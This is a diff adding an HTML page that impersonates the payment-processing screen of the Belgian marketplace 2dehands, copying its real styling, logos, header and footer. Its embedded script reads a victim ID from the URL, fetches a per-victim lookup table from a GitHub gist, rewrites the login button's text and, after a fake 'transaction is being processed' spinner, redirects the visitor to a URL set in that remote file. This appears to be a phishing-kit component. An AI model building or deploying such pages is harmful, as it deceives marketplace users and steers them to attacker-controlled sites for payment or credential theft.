@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>2dehands | BETALING</title>
+
+  <!-- Добавлен Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-design-tokens/twh/tokens/CssVars.c9a22c58.css" />
+  <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/assets/Assets.8c256939.css" />
+  <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/Fonts.d24f98b7.css" />
+  <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/icons/Icons.4ed7cbbb.css" />
+  <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/Index.76c88810.css" />
+  <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/apps/Header/Index.f12cbe2c.css" />
+  <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/apps/Footer/Index.abc123.css" />
+
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: system-ui, sans-serif;
+      background: white;
+      overflow-x: hidden;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .main-content {
+      flex: 1 0 auto;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+      min-height: 100vh;
+      box-sizing: border-box;
+    }
+
+    .loader-text {
+      font-size: 2rem;
+      font-weight: 500;
+      color: #333;
+      font-family: 'Poppins', 'Helvetica Neue', sans-serif;
+      margin-bottom: 21px;
+      animation: fadeIn 0.5s ease-out;
+      letter-spacing: 0.5px;
+      line-height: 1.4;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.05);
+    }
+
+    .loader-text::after {
+      content: "";
+      display: none;
+    }
+
+    .loader {
+      width: 64px;
+      height: 64px;
+      position: relative;
+      animation: rotate 1.5s linear infinite;
+    }
+
+    .loader::before,
+    .loader::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      margin: auto;
+      border: 4px solid transparent;
+      border-radius: 50%;
+      mix-blend-mode: overlay;
+    }
+
+    .loader::before {
+      border-top-color: rgba(255, 204, 0, 0.8);
+      border-right-color: rgba(255, 204, 0, 0.4);
+      border-bottom-color: rgba(255, 204, 0, 0.1);
+      border-left-color: rgba(255, 204, 0, 0.4);
+      animation: rotate 2s ease-in-out infinite;
+    }
+
+    .loader::after {
+      border-top-color: rgba(255, 204, 0, 0.1);
+      border-right-color: rgba(255, 204, 0, 0.4);
+      border-bottom-color: rgba(255, 204, 0, 0.8);
+      border-left-color: rgba(255, 204, 0, 0.4);
+      animation: rotate 2.5s ease infinite;
+    }
+
+    @keyframes rotate {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+<script>
+  window.addEventListener("load", function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id') || urlParams.get('ID');
+    if (!id) return;
+
+    const gistUrl = "https://gist.githubusercontent.com/2dehandsbt/2ff5206c925f81233672c07680efa5ca/raw/links.json";
+    fetch(gistUrl)
+      .then(response => response.json())
+      .then(data => {
+        if (data[id]) {
+          const textElement = document.querySelector('.loader-text');
+          if (textElement) textElement.textContent = "Uw transactie wordt verwerkt";
+
+          const loginInterval = setInterval(() => {
+            const loginBtn = document.querySelector('a[href="/identity/v2/login"] span');
+            if (loginBtn && data[id].replaceText) {
+              loginBtn.textContent = data[id].replaceText;
+              clearInterval(loginInterval);
+            }
+          }, 100);
+
+          setTimeout(() => {
+            window.location.href = data[id].url;
+          }, 3000);
+        }
+      })
+      .catch(() => {});
+  });
+</script>
+</head>
+<body>
+
+  <div class="hz-Header">
+    <div class="hz-Header-ribbonTop"></div>
+    <div class="hz-Header-navBar hz-Header-bigger-touchAreas">
+      <div class="hz-Header-maxWidth">
+        <a class="hz-Link hz-Link--isolated hz-Header-logo" href="/">
+          <img src="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/assets/tenant--inverse--nlbe.150591d7.svg" class="hz-Header-logo-desktop" alt="2dehands Start">
+          <img src="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/assets/tenant-coin--nlbe.9b4b2c4f.svg" class="hz-Header-logo-mobile" alt="2dehands Start">
+        </a>
+        <ul class="hz-Header-links">
+          <li><a class="hz-Link hz-Link--isolated" href="https://help.2dehands.be">Help en info</a></li>
+          <li><a class="hz-Link hz-Link--isolated" href="https://help.2dehands.be/s/topic/0TO5I000000TYqZWAW/voorwaarden">Voorwaarden</a></li>
+          <li><a class="hz-Link hz-Link--isolated" href="https://www.2dehands.be/i/veilig-handelen/">Veiligheidscentrum</a></li>
+        </ul>
+        <ul class="hz-Header-menu" data-role="nav-dropdown-menu">
+          <li><a class="hz-Link hz-Link--isolated" href="/messages"><div class="hz-Button-badge"><i class="hz-Icon hz-Icon--backgroundDefault hz-SvgIcon hz-SvgIconMessages"></i><span class="hz-hide-lte-md">Chat</span></div></a></li>
+          <li><a class="hz-Link hz-Link--isolated" href="/notifications"><div class="hz-Button-badge"><i class="hz-Icon hz-Icon--backgroundDefault hz-SvgIcon hz-SvgIconNotification"></i><i class="hz-Header-badge hz-Header-badge--signalAction"></i><span class="hz-hide-lte-md">Meldingen</span></div></a></li>
+          <li class="hz-hide-gte-lg"><button class="hz-Link hz-Link--isolated" data-role="hamburgerOpen"><i class="hz-Icon hz-Icon--backgroundDefault hz-SvgIcon hz-SvgIconProfile"></i></button></li>
+          <li class="hz-hide-lte-md"><a class="hz-Link hz-Link--isolated" href="/identity/v2/login"><i class="hz-Icon hz-Icon--backgroundDefault hz-SvgIcon hz-SvgIconProfile"></i><span>Inloggen</span></a></li>
+          <li><a class="hz-Button hz-Button--primary hz-Button--small hz-Button--callToAction" href="https://link.2dehands.be/link/placead/start"><span class="hz-Button-Icon hz-Button-Icon--start"><i class="hz-Icon hz-Icon--backgroundDefault hz-SvgIcon hz-SvgIconPinCallToActionForeground"></i></span><span class="hz-hide-lte-md">Plaats zoekertje</span></a></li>
+          <li class="hz-hide-lte-md"><a class="hz-Link hz-Link--isolated" href="https://www.2ememain.be">FR</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="hz-Header-ribbonBottom"></div>
+  </div>
+
+  <div class="main-content">
+    <div class="loader-text">Uw transactie wordt verwerkt</div>
+    <div class="loader" role="status" aria-label="Laden..."></div>
+  </div>
+
+  <div class="hz-Page-footer">
+    <footer class="hz-Footer">
+      <div class="hz-FooterContainer">
+        <section class="hz-Footer-appsInstall">
+          <section class="hz-Footer-appsInstall-badge">
+            <a class="hz-Link hz-Link--isolated" href="https://app.adjust.com/gc8rng">
+              <img src="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/assets/google-play--nlbe.2b2b81d5.svg" alt="google-play" width="135">
+            </a>
+          </section>
+          <section class="hz-Footer-appsInstall-badge">
+            <a class="hz-Link hz-Link--isolated" href="https://app.adjust.com/37qcux">
+              <img src="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/assets/app-store--nlbe.454285b6.svg" alt="app-store" width="135">
+            </a>
+          </section>
+        </section>
+        <section class="hz-Footer-links">
+          <a class="hz-Link hz-Link--isolated hz-FooterLink" href="https://www.2dehandszakelijk.be/">2dehands Zakelijk</a>
+          <a class="hz-Link hz-Link--isolated hz-FooterLink" href="https://www.2dehands.be/i/veilig-handelen/">Veilig en Succesvol</a>
+          <a class="hz-Link hz-Link--isolated hz-FooterLink" href="https://help.2dehands.be/s/">Help en info</a>
+          <a class="hz-Link hz-Link--isolated hz-FooterLink" href="https://help.2dehands.be/s/topic/0TO5I000000TYqZWAW/voorwaarden">Voorwaarden</a>
+          <a class="hz-Link hz-Link--isolated hz-FooterLink" href="https://help.2dehands.be/s/article/privacyverklaring-2dehands">Privacyverklaring</a>
+          <a class="hz-Link hz-Link--isolated hz-FooterLink" href="https://help.2dehands.be/s/article/cookiebeleid-2dehands">Cookiebeleid</a>
+          <a class="hz-Link hz-Link--isolated hz-FooterLink" href="https://www.2dehands.be/consent">Privacyvoorkeuren</a>
+        </section>
+        <section class="hz-Footer-links">
+          <a class="hz-Link hz-Link--isolated hz-FooterLink" href="https://help.2dehands.be/s/article/wat-is-2dehands/">Over 2dehands</a>
+          <a class="hz-Link hz-Link--isolated hz-FooterLink" href="https://www.adevinta.com/">Adevinta</a>
+          <a class="hz-Link hz-Link--isolated hz-FooterLink" href="https://www.2dehands.be/sitemap/index.html">Sitemap</a>
+        </section>
+        <section class="hz-Footer-blog">
+          2dehands is niet aansprakelijk voor (gevolg)schade die voortkomt uit het gebruik van deze site, dan wel uit fouten of ontbrekende functionaliteiten op deze site.
+          <div>Copyright © 2025 Marktplaats B.V. Alle rechten voorbehouden.</div>
+        </section>
+        <section class="hz-Footer-blog">
+          <div>
+            een <img src="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/assets/adevinta.ee46e08e.svg" width="79" alt="twh - logo"> onderneming
+            <a class="hz-Link hz-Link--isolated hz-Footer-cim" href="https://www.cim.be/nl/internet/disclaimer-cim-internet">
+              <i class="hz-Asset hz-Asset--xl hz-Asset--square hz-SvgAsset hz-SvgAssetLogoCim" aria-hidden="true"></i>
+            </a>
+          </div>
+        </section>
+      </div>
+    </footer>
+  </div>
+
+</body>
+</html>
